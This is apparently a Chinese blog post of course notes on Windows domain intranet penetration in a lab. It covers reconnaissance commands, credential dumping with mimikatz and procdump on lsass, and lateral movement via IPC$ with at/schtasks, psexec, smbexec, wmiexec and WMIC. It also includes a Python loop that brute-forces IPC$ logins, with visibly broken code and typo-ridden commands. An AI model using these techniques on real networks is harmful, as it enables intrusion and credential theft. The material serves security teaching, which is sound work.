# XD安全渗透测试 学习笔记 | 内网渗透(一)

原创 耳鼠 [0x00实验室](javascript:void(0);) *2021-08-10 09:08*

收录于合集

\#内网渗透1个

\#小迪安全笔记20个

 本文为团队成员耳鼠学习XD师傅课程的笔记，仅供参考，其中有误之处还望自行甄别。

这是一个系列的学习笔记，点个关注。定期更新！

上篇：权限提升 [XD安全渗透测试课程 学习笔记 |  提权阶段](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247483877&idx=2&sn=35f4bdce1d4043219dbbb67420bb5818&chksm=cfd87e1af8aff70c74e6a5541d7b120548ac3242a320083a81f4b0ae3971d60b2903e7245705&scene=21#wechat_redirect)

------



day65.域环境&⼯作组&局域⽹探针⽅案

 

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2YYEv6Yl619GBJx2ZkdIjJLgSSMNZd6y8XicvrKiaJAXJVwvHZV16oPSA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

 

域控制器DC就是域的管理服务器

 

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2Q2wD1nL1s8R2HziamE7DrqGX49gcSBSj1jybfesn5YyMLPcTJCdicaKw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

 

 

 

## 演示案例：

基本信息收集操作演示

旨在了解当前服务器的计算机基本信息，为后续判断服务器⻆⾊，⽹络环境等做准备        systeminfo 详细信息

  net start 启动服务t

  asjlist 进程列表

  schtasks 计划任务



⽹络信息收集操作演示

  旨在了解当前服务器的⽹络接⼝信息，为判断当前⻆⾊，功能，⽹络架构做准备ipconfig /all 判断存在域-dns







有域

 

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm28rgyD8icR70jwU9aoeFMoEkEDv2y8MAhjCpSpN90TibvLK1tEofIxLtg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

没有域

 

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2DKG1xwWYZefLEdPwk3QeicoeVGtdPA1BNfzbpmcvdty1DDVMaqIY2QQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

 

 判断是否存在域：

net view /domain

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm26gHWzac2SeSOpoGntzy9y8GKDlmGdEwgod3XHlCOdthFBYvBKhlW6Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2czOK7M7hksLKibAknExrvYVQP2zyd6bYNWrRVMonfIuDiaf8eenVicNog/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



 获得一个计算机名字,我们可以通过ping命令来获取IP地址

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2zfpucbKCZjAoEkOpp1qhk2e9bicvFr42KOkHdvy5GLUwB404yfOMbmQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

 

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2O1ytAENNLIT7Jlql6riaY7JlguyeQJ4VrUmjaeZ27J7prdItzMbUefA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

netstart -ano 当前网络端口开放：

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2vW42oXHTTbBKG7Vcg39e76a24RygviaQwcicletUlQXnia4vH6QRia96Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



nslookup 域名追踪来源地址：

 

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2piadoqGzSLaLuvaibguUXIq7cz9lEu2iaLVxM1868M6U67l8iampuFB5Jg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

 

 

⽤户信息收集操作演示

旨在了解当前计算机或域环境下的⽤户及⽤户组，便于后期利⽤凭证进⾏测试

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm23O6bCptFvAYyS24umbtdTzLgYCYeficfBqtCPeDSzEnGtVexfSSxlFw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

 

 

主要针对Domain Admins/Enterprise Admins 相关⽤户收集操作命令：

Whoami /all ⽤户权限

net config workstation 登录信息

net user 本地信息

 

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2uwD72ibU6KKNE3w7JX7nuKAjg2yfApW4gNfMG9ibd5gba5RUMsel3n8w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



net localgroup 本地⽤户组

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2t5xRuRibGRHIspC76YwDW7ZYhtiaq8fONuia4MTu47nMXo6pgtHByDDwg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



net user /domain 获取域用户信息

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2KWNIngibzN1kSTtKkEyImTf16jn8b4pL6rUysryIeXibxjcjlZqtcljA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



net group /domain 获取域用户组信息



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2J4hPMwWBiaCnQmbB0czicEMaVwaNJfBAjkPWyvJibl3qEZwYhvBoiczgCg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



wmic useraccount get /all 涉及域用户详细信息

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2a6mkqMo8ALgvtvfPU8KKaMZwtJG4dAoXD5WUBkvwcTALLwzQpBd0Eg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



net group "Domain Admins" /domain 查询域管理员账户

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2Y8mLuicgnUia1Xv1ROv4koWHmwuM1sJusnLNCzVzrsB49YIbLpajibib9g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



net group "Enterprise Admins" /domain 查询管理员用户组

net group "Domain Controllers" /domain 查询域控制器

当你打开当前web server的本机管理时会跳出

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2nmeicwkzIiarG7lDLRJqaMUsnNfE30iaGsoTYibo9nceSflGF1I83uaAbA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



  需要验证账号密码才能操作,这个就是因为AD目录来操控的,域成员主机权限不够。现在的用户是GOD\webadmin域成员

  我们可以切换账号至WEBSERVER|administrator

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm21dibgCyYqqeibTydMAgUwtuPChwxf0KgpARRtM5IqqxQdYjOK310EZsw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



这个时候就可以查看了。现在用的是自己的账号,而非域账号

通过这些收集,我们可以得到域用户名,如果再得到密码,就可以登录操控了



**凭证信息收集操作演示**

  旨在收集各种密文、明文、口令等,为后续横向渗透做好准备

  

计算机用户HASH,明文获取-mimikatz(win),mimipenguin(Linux)

​    如果是GOD\webadmin,是无法运行的,权限不足,权限提升

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2NfiaaxibE5m9dUXlo8bo6c5hcTQ93g7FT4e1HPNZDu7N9OOibTkOHicm7w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



按照帮助文档进行操作

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2Z3XlRJKicTuuWgu06xcPxPfLa5MZz8X8DxAs7uZwx20aAETsAuJpxLQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



mimipenguin(Linux)只支持部分Linux

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2djPh1U2davz7CcbjvMxyoYAQddwE0ZBIictkpgKyPLogicNML23yPp2g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2tPaEIDicBX9FyXjmXZPs9zZ9uZhOyibhpwicJIVfiaPndEhjKZicxFYQSbA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

计算机各种协议服务口令获取-LaZagne(all),XenArmor(win)

  LaZagne(all)支持全系统,但垃圾

  XenArmor(win)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2icnkqyvms8g8bP9FETwmGwQ1RvMPUTqhaibTPU0rLz3ojxxrHNESp3XA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



根据需要配置环境路径

Netsh WLAN show profiles

Netsh WLAN show profiles name="无线名称" key=clear

  1.站点源码备份文件、数据库备份文件等

  2.各类数据库web管理入口,如PHPMyadmin

  3.浏览器保存密码、浏览器Cookie

  4.其他用户会话,3389和ipc$连接记录、回收站内容

  5.Windows 保存的WiFi密码

  6.网络内部的各种和面膜,如:Email,VPN,FTP、OA等





**探针主机域控架构服务操作演示**

为后续横向思路做准备,针对应用,协议等各类攻击手法

探针域控制器名地址信息

net time /domain nslookup ping



探针域内存活主机及地址信息

nbtscan 192.168.3.0/24 第三方工具

  一个老牌工具,既不免杀,还得下载

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm22fAHPticcsZjsgCJRluvu5YIXDH9zXI2dcSlUTVSL5RNLo8F08ljGLg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

for /L %I in(1,1,254) DO @ping -w 1 -n 1 192.168.3.%I |findst "TTL=" 自带内部命令

  自带内部命令,不用免杀,缺点,显示内容没有那麽多,只有目标的地址

nmap masscan 第三方Powershell脚本nishang empire等

用第三方的工具扫描可能会被监控到,从而被拦截



\#导入模块nishang

Import-Moddule .\nishang.pm1



\#设置执行策略

Set-ExecutionPolicy RemoteSinged



\#获取模块nishang的命令函数

Get-command -Module nishang



\#获取常规计算机信息

Get-Infirmation



\#端口扫描

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2NHRvXeE07TVG0QpWWsYPqHDhWD7rhsaFm8OaPia14rZY5eRibwn1mgng/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

\#其他功能:删除补丁,fantanshell,凭证获取

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2UicE0m7ywIh49yN3C83kZbXXghLkqncro9PwfGucs88NOQYialK3LTOQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2ic29dSYJdGjFtEeXIGs4vbHeNSaBDuJuVzkUjokRXedx63Osvez2GcA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2QXAOrZz2GU11iaJbSmJfCaxRqnhnw3Fvrox5LCNxhOLjtZyklBfeRQg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2DlNIJLt2NH890BZtODfTPDnIH42GP5mV0zPnbnBtLBh2lciavxIHVEQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2OAo3UFUia8atUXbSIbSLPpVHmhXODsWuYQETIRbKfia0SG1c7GhC8uuQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)









------

**day66.域横向批量 at&schtasks&impacket**

''传递攻击是建立在明文和hash获取介质上的一种攻击

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2D28wp3MZ68ys1h546AjmjqoNf6oqiaibNhiazCaCDh0GmFD4hVHmmF4zQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)





![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2ylDvRm1lR3v47BrXYlNiaMw6TS7TXbfzOVSeO4xOedmflknknBOJjibg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2WWpTZibxnnHibCIP7MkaB0vSdrmUmj560HBl4gMk4MKyxYbHtur4nCHQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



演示案例

**案例1-横向渗透明文传递at&schtasks**

在拿下一台内网主机后,通过本地信息搜集收集用户凭证等信息后,如何横向渗透拿下更多的主机?



这里仅介绍at&schtasks命令的使用,在已知目标系统的用户明文密码的基础上,直接可以在远程主机上执行命令。获取到某域主机权限->minikatz得到密码(明文,hash)->用到信息收集里面域用户的列表当作用户字典->用到密码明文当作密码字典->尝试连接->创建计划任务(at|schtasks)->执行文件为后⻔或相关命令



利用流程:

- 1.建立IPC链接到目标主机
- 2.拷⻉要执行的命令脚本到目标主机
- 3.查看目标时间,创建计划任务(at,schtasks)
- 4.删除IPC链接



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2vUukZqUgd1CYjour9NkCic7IVxBtic38sM8Irth2VZdwlbQr4LQxTtEg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2xaia8E2blUcQmMuM7vQMtSotSkN5WdsKgzxBrG8PMDYlicJIgUNUq5MQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



[at] & [schtasks] 都是基于定时任务的攻击

\#at < Windows2012

net use \\192.168.3.21\ipc$ "Admin12345" /user:god.org\administrator #建立IPC连接:

copy add.bat \\192.168.3.21\c$ #拷⻉执行文件到目标机器(实战中大多是CS或者MSF木⻢)

at \\192.168.3.21 15:47 c:\add.bat #添加计划任务



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2MIR8cfMoLgyFMIOU0Ky79Pc3QNia94PrHgHHkTduBPnDvGz2KbU7JWw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2T5kuaj4fibWNbMs98UlQiaiatHWhW9uT6Kl1Fz9cD3PCtXtoFUowBJoFQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm23NoeS3Z6iau9CAtdFz3VT1jjIE6YGbEL7EswfrOt60OuVXrEA8xGRdg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2jclYCpe8lxAwVswj28pWFKicsQX312InupA1jUoKpjicawTiay9hYbvHQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



- 
- 
- 
- 
- 
- 
- 

```
#schtask >=Windows2012net use \\192.168.3.32\ipc$ "admin!@#45" /user:god.org\administrator #建立ipc连接copy add.bat \\192.168.3.32\c$schtasks /create /s 192.168.3.32 /ru "SYSTEM" /tn adduser /sc DAILY/tr c:\add.bat /F #创建adduser任务对应执行文件schtasks /run /s 192.168.3.32 /tn adduser /i #运行adduser任务schtasks /delete /s 192.168.3.32 /tn adduser /f #删除adduser任务
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2JlgCDkVM9MEBTztyfLzpxEGXI6z2t7ucleAHic6Rc77SmMtq8iaricw9A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2vXekqRCOH4g3nZniazPV0lPgDPbxpBo04mz8JzEu7CpaFCqyyhG04PQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**案例2-横向渗透明文HASH传递atexec-impacket**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2F0tn35hbPVIEp5iauzNY343ElAkG9xwNLwKl9icEe7kquZSXibicdQ29Zw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2eKibBwddiciabxlcIBW1jWZPSOq0iceMpIicYTg0f5YsZxMAfYBHiaadzQxg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

  还自带提权。优点:方便快捷,可以支持hash。缺点:第三方工具,会受到杀毒软件或防护的影响。如果目标主机有杀软或防护的话,要对该软件进行免杀



**案例3-横向渗透明文HASH传递批量利用-综合**

  webServer已经拿到权限

  获取密码

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2ut6Em45bnEVwEKOtDQYfsnljMtVOibRzt7CKDbPaK4naKoAkicz0URIQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



获得本机密码

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2YZQpH6QGGJAD1ibkjcmRSBKUeeOUh9WdaCohwJwRlsl0G6m9mvuwzXA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

探针存活主机

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2HFibOqjYicNvGFgc7EGP4MsR2UUM2GTSh8RwHQhj9SeWNnm4Gwrh7CJg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



  使用批处理来跑多个IP地址使用固定的密码账号,来执行个whoami,ips.txt就是刚才收集到存活主机的IP地址

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2ZEmIvFnfWBjoGNOKpTZNiaAkm6HfnWmPtySlpgvJVyagMPZ0jZyJImA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm22elvJib7icVfDw92vrVwRsN7zFlJKia8j00YCABQBPDGyMyYJso3S2ibKA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



192.168.3.29采用的是同密码

继续拿下这个主机,重复之前操作。丰富密码字典。

之后拿密码字典去攻击域控

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2JKrJIbgxagxGCyluiajyceFNz7ppYX1dwibRm3atwGLar6scaYuZH3yQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2QiaBhH6EBhO2f8LoQWQVr9bfQhYoLJvLeDVQhbsNyT5YcUyDWVNkEeQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

用户名也可以变。以上bat缺点只有一个变量。可以用bat实现多变量,也可以使用python写,然后使用第三方库,打包成.exe



net use \\192.168.3.32\ipc$ admin!@#45 /user:god\dbadmin

  \#pip install pyinstaller

  \#pyinstaller -F fuck_neiwang_001.py 生成可执行EXE



- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 

```
import os,timeips={'192.168.3.21','192.168.3.25','192.168.3.29','192.168.3.30','1'}user = {'Administrator','boss','dbadmin','fileadmin','mack''mary''vpnadm''webadmin'passs = {'admin','admin!@#45','Admin12345'}for ip in ips:for user in users:for mima in passs:exec = "net use \\"+"\\"+ip+"\ipc$ "+mina+" /user:god\\"+userprint("----->"+exec+"<-----")os.system(exec)time.sleep(1)
```



------

**day67.域横向 smb&wmi 明文或 hash 传递**



知识点1:

Windows2012以上版本默认关闭wdigest,攻击者无法从内存中获取明文密码

Windows2012以下版本安装KB2871997补丁,也会导致无法获取明文密码



针对以上情况,我们提供了4种方式解决此类问题

- 1.利用哈希hash传递(pth,ptk等)进行移动
- 2.利用其他服务协议(SMB,WMI等)进行哈希移动
- 3.利用注册表操作开启Wdigest Auth值进行获取
- 4.利用工具或第三方平台(Hachcat)进行破解获取



知识点2:

  Windows系统LM HASH及NTLM Hash加密算法,个人系统在Windows vista后,服务器系统在Windows 2003以后,认证方式均为NTLM Hash。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2bDTfsmZBGicjgVzpVAn6NBM6NK9T1aOz2Rn5YJEYwxAosG97nNRcANg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

演示案例:

案例1-Procdump+Mimikatz配合获取

procdump是Windows官方的工具

如果上传Minmiktz上传后被杀,可以使用Procdump+Mimikatz这个方法

运行procdump在当前目录下生成lsass.dmp文件

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2lxLuiaclRhZBYueqJjq4JfcC8jYibs64cSZUicOeJU6Zd3iasGRtZefVtw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

然后再在mimi上使用命令还原出来密码

在目标主机上用proc生成文件,然后再在本地上用Mim还原出密码



- 
- 
- 

```
# mimikatz上执行:sekurlas::minidump lsass.dmpsekurlas::logonPasswords full
```



Hashcat破解获取Windows NTML Hash

- 

```
hashcat -a 0 -m 1000 file --force
```



**案例2-域横向移动SMB服务利用-psexec,smbexec(官方自带)**

  利用SMB服务可以通过明文或hash传递来远程执行,条件445服务端口开放。

  \#psexec第一种:先有ipc链接,psexec需要明文或hash传递

​    net use \\192.168.3.32\ipc$ "admin!@#45" /user:administrator

​    psexec \\102.168.3.32 -s cmd #需要先有ipc链接 -s以system权限运行



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2WMpa6iczIs5UDMoc7kuKDEictA7MkmCMibksW1uY7UK26unhK7UHuLicdg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



\#psexec第二种:不用建立IPC直接提供明文账户密码

官方Pstools无法采用hash连接

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2keuO7nqLE0c4eLyepH4VTiaJNprQx3GCvibjkQvbEXbwhWZNTdWwNxog/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

在官网下载pstools,上传至目标主机

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2ol5g4BglQThQ3lbzXmeSiaAc4xtS3Ogdaq39DHSrx4WndFNfcDXGJTQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

  执行命令,将前期信息收集到的ip地址,用户名 ,密码,反弹回cmd

基于Hash的:

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm21tqFwibZibo5QxvcMvmzL3R0iaw2OiaEHmkTOR90vNKvZgAcXcnNEj6ogQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



执行时出现了问题,解决需要用到一个非官方的库impacket

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2WT3CbDia6EJxEcUUsav13ISDnR1QAvSexUcNRCx1r1iaFYw8ZE1JlPqw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  反弹成功



**#smbexec无需先ipc链接 明文或哈市传递**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2vsaibEyMKgib8czicsSkeXPkOVGDibFhFH5mb4FOAAyic1GicmtZN4icWGd8A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2qCGPSltSNRHo55NDccUtQ8cD8Q2hb5EiaiaFibRNuG4CJEE2siaLn1ic4icA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2hicWynRu5AO11RicH9BSBDFPpg7uzswYxIljhJwS4JrXQBEsqua54OicA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



域横向移动WMI服务利用-cscript,wmiexec,wmic

  WMI(windows Management Instrumentation)时通过135端口进行利用,支持用户名明文或者hash的方式进行认证,并且该方法不会在目标日志系统留下痕迹

  \#自带WMIC 明文传递 无回显(缺点,功能比较尴尬)

- 

```
wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create"cmd.exe /c ipconfig >C:\1.txt
```

原本是没有1.txt

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2XHQI1BnNObQE1wwau30FvnO24MBqcic5fecddraK9JiaicxFbic3IYkG7w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



在目标主机上执行命令,等待连接

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2chONF4ibHY8vSSicVNulozIGG2FcXRWsxbzG31mSenKhb3rLITQ1pltw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



连接完毕后,在目标主机上连接的那个域主机上出现了1.txt

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm29zu4l1ogsN7BsIcbqNfwgqTnrzqD1gewuCVq3W8mcwZWv0s9AIA70g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2icEXZstiaMXJ3LuiaLXqZlwUibVI65UhicysBFibQNKZD5ZOAyRUlrvXc4IA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

需要借助一个wmiexec.vbs文件,在资源中有

执行命令,反弹cmd



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2zuPwJDCZFuUickQBlpKj7mfWiabELOA8Lz2v8GJHUA9O5RkHFW5JDIPA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm235yR2Ar6VMYv9pQ3zQb4PCNDMKPqMdjchU8AO8dgoLauhkzuUrOGGQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2ibgydcQ5oNEXibFyyhzrc4O8Kic5Z75NO0PHNUrOxGkon9BG9tQdGfjYA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2SVQJzPicVcicxQicASgT368XTWgT2gMkUHnZzkP6JPnfwgD7icUxVktIPQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![img](http://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9wW2QG2oK5uzovZSDDzOZ4gDCbj3HLU1dyvmdC05wDsMu3icGXA4hxDCbBFibmIkGhria16Sa3YlrjQ/300?wx_fmt=png&wxfrom=19)

**0x00实验室**

网络安全从业者 @人无名 便可潜心练剑

128篇原创内容



公众号